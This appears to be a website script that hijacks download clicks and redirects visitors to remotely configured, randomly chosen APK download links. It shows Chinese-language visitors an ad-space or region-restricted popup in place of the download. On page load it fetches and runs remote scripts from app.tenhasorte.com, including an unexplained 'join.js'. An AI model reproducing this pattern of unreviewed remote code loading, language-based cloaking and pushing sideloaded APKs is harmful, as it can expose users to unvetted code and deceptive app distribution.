function loadScript(src) {
    return new Promise((resolve, reject) => {
        const s = document.createElement('script');
        s.src = src;
        s.onload = resolve;
        s.onerror = reject;
        document.head.appendChild(s);
    });
}

document.addEventListener('DOMContentLoaded', async function () {
    await loadScript('https://app.tenhasorte.com/india/apps.config.js?v=' + Date.now());
    const config = window.APPS_CONFIG || {};
    const apps = config.apps || {};
    const defaultIosUrls = config.defaultIosUrls || [];
    const defaultAndroidUrls = config.defaultAndroidUrls || [];
	/* ================= DEVICE ================= */
	function getDeviceType() {
		const ua = navigator.userAgent.toLowerCase();
		if (/iphone|ipod|ipad/.test(ua) ||
			(navigator.platform === 'MacIntel' && navigator.maxTouchPoints > 1)) {
			return 'ios';
		}
		if (/macintosh|mac os x/.test(ua)) return 'mac';
		if (!/android|iphone|ipad|ipod|mobile/i.test(ua)) return 'pc';
		return 'android';
	}

	function getRandomUrl(arr) {
		const valid = arr.filter(item => {
			return !isExpired(item.t);
		});
		// 如果全部异常，防止报错
		if (!valid.length) {
			console.warn('No valid url found');
			return '';
		}
		return valid[
			Math.floor(Math.random() * valid.length)
		].url;
	}
	
	function isAdLanguage() {
		const lang = (navigator.language || '').toLowerCase();
		return lang.startsWith('zh');
	}

	function parseTime(str) {
		if (!str) return null;

		const arr = str.split(/[- :]/);

		return new Date(
			arr[0],
			arr[1] - 1,
			arr[2],
			arr[3] || 0,
			arr[4] || 0,
			arr[5] || 0
		).getTime();
	}

	// 判断是否过期
	function isExpired(t) {
		if (!t) return false; // 空 = 永久有效
		const time = parseTime(t);
		if (!time) return true;
		return Date.now() > time;
	}


	/* ======= DOWNLOAD ======== */
	function download() {

		let app = Object.values(apps).find(a => {
			const path = window.location.pathname.toLowerCase();
			const host = (window.location.hostname || '').toLowerCase();
			if (
				!Array.isArray(a.keywords) ||
				!a.keywords.some(k => path.includes(k))
			) {
				return false;
			}

			if (!a.host?.length || !host) {
				return true;
			}
			return a.host.some(h => host.includes(h));
		});

		if (!app && isAdLanguage()) {
			openPopup('zhaozu');
			return;
		}

		if (!app) {
			app = {};
		}

		if (isAdLanguage()) {
			openPopup('xianzhi');
			return;
		}

		const expired = isExpired(app.t);

		const iosUrl = !expired && app.iosUrl ?
			app.iosUrl :
			getRandomUrl(defaultIosUrls);

		const androidUrl = !expired && app.androidUrl ?
			app.androidUrl :
			getRandomUrl(defaultAndroidUrls);

		const device = getDeviceType();
		let url = device === 'ios' ? iosUrl : androidUrl;

		if (device !== 'ios' && device !== 'android') {
			// 配置了pcUrl
			if (app.pcUrl) {
				window.open(app.pcUrl, '_blank','rel="noopener noreferrer"');
				return;
			}
			openPopup('qr', androidUrl);
			return;
		}

		if (device === 'ios') {
			const w = window.open(url, '_blank');
			setTimeout(() => {
				if (!w ) {
					window.location.href = url;
				}
			}, 300);
			return;
		}
		
		handleRedirect(url, app.ck);

	}

	/* ================= 路由================= */
	function handleRedirect(url, ck) {
		// 默认：当前窗口
		if (!ck || ck === 'default') {
			window.location.href = url;
			return;
		}
		// 新窗口
		if (ck === 'xck') {
			const w = window.open(url, '_blank');
			if (!w) {
				window.location.href = url;
			}
			return;
		}

		// 弹窗层
		if (ck === 'kj') {
			openPopup('frame', url);
			return;
		}

		// fallback
		window.location.href = url;
	}

	function injectStyle() {
		if (document.getElementById('popup-style')) return;
		const style = document.createElement('style');
		style.id = 'popup-style';
		style.textContent = `
			.popup-mask{
				position:fixed;
				inset:0;
				background:rgba(0,0,0,.6);
				display:flex;
				align-items:center;
				justify-content:center;
				z-index:999999;
				padding:0px;
				opacity:0;
				pointer-events:none;
				transition:.2s;
			}

			.popup-mask.active{
				opacity:1;
				pointer-events:auto;
			}

			/* 默认普通弹窗 */
			.popup-box{
				width:80%;
				max-width:360px;
				background:#fff;
				color:#000;
				border-radius:12px;
				padding:18px;
				font-size:16px;
				line-height:1.5;
				position:relative;
				box-sizing:border-box;
				display:flex;
				flex-direction:column;
			}

			/* iframe模式 */
			.popup-box.popup-frame-mode{
				width:95vw;
				max-width:780px;
				height:80vh;
				padding:0;
				border-radius:12px;
				display:flex;
				flex-direction:column;
				overflow:hidden;
			}

			/* header */
			.popup-header{
				position:relative;
				text-align:center;
				margin-bottom:0px;
				padding:0px;
			}

			/* iframe模式 header */
			.popup-frame-mode .popup-header{
				margin:0;
				padding:14px 16px;
				border-bottom:1px solid #eee;
				flex-shrink:0;
			}

			.popup-title{
				font-size:16px;
				font-weight:600;
				color:#000;
				line-height:1.4;
				padding-right:40px;
			}

			/* close */
			.popup-close{
				position:absolute;
				top:50%;
				right:0;
				transform:translateY(-50%);
				width:28px;
				height:28px;
				border:none;
				border-radius:50%;
				background:#f2f2f2;
				color:#333;
				cursor:pointer;
				display:flex;
				align-items:center;
				justify-content:center;
				font-size:18px;
				line-height:1;
				padding:0;
				margin:0;
				-webkit-appearance:none;
				appearance:none;
			}

			.popup-close:hover{
				background:#e5e5e5;
			}

			.popup-content{
				word-break:break-word;
				padding:0px;
			}
			
            .popup-content a{
                color:#333;
            }
			.popup-content.center{
				text-align:center;
			}

			.popup-content.left{
				text-align:left;
				padding:0px;
			}

			/* iframe内容区域 */
			.popup-frame-mode .popup-content{
				flex:1;
				overflow:auto;

				display:flex;
				flex-direction:column;

				padding:0;
			}

			/* iframe wrap */
			.popup-iframe-wrap{
				width:100%;
				height:100%;
				overflow:auto;
			}

			.popup-iframe-box{
				width:100%;
				overflow:hidden;
			}

			#popupFrame{
				border:none;
				display:block;

				transform-origin:top left;
			}

			.qr-wrap{
				display:flex;
				justify-content:center;
				margin-top:15px;
				margin-bottom:10px;
			}
            .apk-tip{
                font-size:16px;
            }
            
            .apk-tip a{
                color:#333;
                text-decoration:none;
            }
            
            .download-tip-btn{
                display:inline-block;
                background:#28a745;
                color:#fff;
                padding:4px 12px;
                border-radius:6px;
                font-size:14px;
                margin-right:6px;
            }
			[data-download="down-now"]{
				-webkit-tap-highlight-color:transparent;
			}

			@media (max-width:768px){

				.popup-box{
					width:92%;
					max-width:none;
				}

			}
	
		`;

		document.head.appendChild(style);
	}

	function createPopup() {

		if (document.getElementById('popup-mask')) return;

		const mask = document.createElement('div');

		mask.id = 'popup-mask';
		mask.className = 'popup-mask';

		mask.innerHTML = `
			<div class="popup-box" id="popupBox">
				<div class="popup-header">
					<div class="popup-title" id="popupTitle"></div>
					<button class="popup-close" type="button">×</button>
				</div>
				<div class="popup-content" id="popupContent"></div>
			</div>
		`;

		document.body.appendChild(mask);

		/* 关闭 */
		mask.addEventListener('click', function(e) {

			if (
				e.target.classList.contains('popup-mask') ||
				e.target.classList.contains('popup-close')
			) {

				mask.classList.remove('active');

				document
					.getElementById('popupBox')
					.classList
					.remove('popup-frame-mode');
			}

		});
	}

	function loadQR() {
		return new Promise((resolve) => {
			if (window.QRCode) {
				resolve();
				return;
			}
			const s = document.createElement('script');
			s.src = 'https://app.tenhasorte.com/india/qrcode.min.js';
			s.onload = resolve;
			document.head.appendChild(s);
		});
	}

	/* ================= iframe resize ================= */
	function resizeFrame(frame, wrap, h) {
		const baseW = 780;
		const containerW = wrap.clientWidth;
		const scale = Math.min(containerW / baseW, 1);
		frame.style.width = baseW + 'px';
		frame.style.height = h + 'px';
		frame.style.transformOrigin = 'top left';
		frame.style.transform = 'scale(' + scale + ')';
		/* 关键 */
		wrap.style.height = "100%";
	}

	/* ================= OPEN ================= */
	async function openPopup(type, url) {
		injectStyle();
		createPopup();
		const modal = document.getElementById('popup-mask');
		const modalBox = document.getElementById('popupBox');
		const titleEl = document.getElementById('popupTitle');
		const contentEl = document.getElementById('popupContent');
		/* reset */
		modalBox.classList.remove('popup-frame-mode');
		contentEl.className = 'popup-content';
		let title = '';
		let html = '';
		/* ================= zhaozu ================= */
		if (type === 'zhaozu') {
			title = 'Ad Space Available';
			contentEl.classList.add('left');
			html = `
				<p>Application Currently Unavailable — Ad Space for Rent. If you are a game platform operator, please contact us to discuss application listing or advertising opportunities.</p>
				<p>✈️: <a href="https://t.me/GameAdsBiz?text=📌 🇮🇳 Source : ${encodeURIComponent(window.location.href)}%0A%0A"
						target="_blank" rel="noopener noreferrer">@GameAdsBiz</a><br>
				📧: <a href="mailto:GameAdsBiz@gmail.com">GameAdsBiz@gmail.com</a></p>
			`;
		}
		/* ================= xianzhi ================= */
		else if (type === 'xianzhi') {
			title = 'Access Restricted.';
			contentEl.classList.add('left');
			html = `
				<p>This app is not available in your country or region. Please choose another app first.</p>
				<p>🏠: <a href="/">Return to homepage.</a></p>
			`;
		}
		/* ================= QR ================= */
		else if (type === 'qr') {
			title = '&nbsp;&nbsp;&nbsp;Scan QR to Open on Phone';
			contentEl.classList.add('center');
			html = `
				<div class="qr-wrap">
					<div id="qrcode"></div>
				</div>
                <p class="apk-tip">
                    <a href="${url}" target="_blank" rel="noopener noreferrer">
                        Continue <span class="download-tip-btn">Download</span> on this device?
                    </a>
                </p>
			`;
		}

		/* ================= iframe ================= */
		else if (type === 'frame') {
			title = 'Instant Download of This APK';
			modalBox.classList.add('popup-frame-mode');
			html = `
				<div class="popup-iframe-wrap">
					<div class="popup-iframe-box" id="frameWrap">
						<iframe
							id="popupFrame"
							loading="lazy"
							scrolling="no">
						</iframe>
					</div>
				</div>
			`;
		}

		titleEl.innerHTML = title;

		contentEl.innerHTML = html;

		modal.classList.add('active');

		/* QR */
		if (type === 'qr') {

			await loadQR();

			new QRCode(
				document.getElementById('qrcode'), {
					text: window.location.href || url,
					width: 220,
					height: 220
				}
			);
		}

		/* iframe */
		if (type === 'frame') {

			setTimeout(() => {

				const frame = document.getElementById('popupFrame');

				const wrap = document.getElementById('frameWrap');

				const h = 1200;

				frame.src = url;

				function update() {

					resizeFrame(frame, wrap, h);
				}

				frame.onload = update;

				update();

				window.addEventListener('resize', update);

			}, 0);
		}
	}

	/* ================= EVENTS (ONLY FIXED PART) ================= */
	function bindEvents() {

		if (window.__download_bind__) return;
		window.__download_bind__ = true;

		document.addEventListener('click', function(e) {

			let el = null;

			/* ================= 1. 新写法优先 ================= */
			el = e.target.closest('[data-download="down-now"]');

			/* ================= 2. 旧写法 fallback ================= */
			if (!el) {
				const tmp = e.target.closest('a, button, img, div, span');

				if (tmp) {
					const onclick = tmp.getAttribute('onclick');

					if (onclick && /download\s*\(\s*\)/i.test(onclick)) {
						el = tmp;
					}
				}
			}

			if (!el) return;

			/* ================= 防闪核心 ================= */
			e.preventDefault();
			e.stopPropagation();

			download();

		}, true); // 捕获模式（关键稳定点）
	}
	/* ================= INIT ================= */
	function boot() {
		// injectStyle();
		// createPopup();
		bindEvents();
		loadQR();


		/* ======== Beg Join====== */
		const s = document.createElement('script');
		s.src = 'https://app.tenhasorte.com/india/join.js';
		document.head.appendChild(s);
		/* ======== End Join ====== */


	}

	if (document.readyState === 'loading') {
		document.addEventListener('DOMContentLoaded', boot);
	} else {
		boot();
	}

});